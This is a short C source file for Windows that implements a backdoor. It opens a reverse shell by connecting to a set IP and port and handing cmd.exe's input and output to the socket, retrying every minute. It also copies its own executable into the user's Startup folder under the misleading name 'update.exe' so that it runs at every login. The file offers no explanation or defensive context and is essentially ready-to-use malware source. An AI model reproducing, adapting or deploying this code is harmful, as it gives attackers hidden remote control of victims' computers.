#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#define ip "127.0.0.1"
#define port 443


int conn() {
	WSADATA wsaData;
    SOCKET Winsock;
    SOCKET Sock;
    struct sockaddr_in hax;
    char aip_addr[16];
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;
    WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
	hax.sin_family = AF_INET;
	hax.sin_port = htons(port);
	hax.sin_addr.s_addr =inet_addr(ip);
	if(WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),0,0,0,0) == 0) {
		memset(&ini_processo, 0, sizeof(ini_processo));
		ini_processo.cb=sizeof(ini_processo);
		ini_processo.dwFlags=STARTF_USESTDHANDLES;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
		char command[8] = "";
		sprintf( command, "cmd.exe");
		CreateProcess(0, command, 0, 0, TRUE, 0, 0, 0, &ini_processo, &processo_info);
		exit(0);
	} else {
		return 1;
	}    
}

int infect(char *file) {
	 char command[1024];
	 sprintf(command, "copy /Y \"%s\" \"%%appdata%%\\microsoft\\windows\\start menu\\programs\\startup\\update.exe\"", file);
	 system(command);
}

int main(int argc, char *argv[]) {
 infect(argv[0]);
 while(conn() != 0) {
   sleep(60);
 }
}

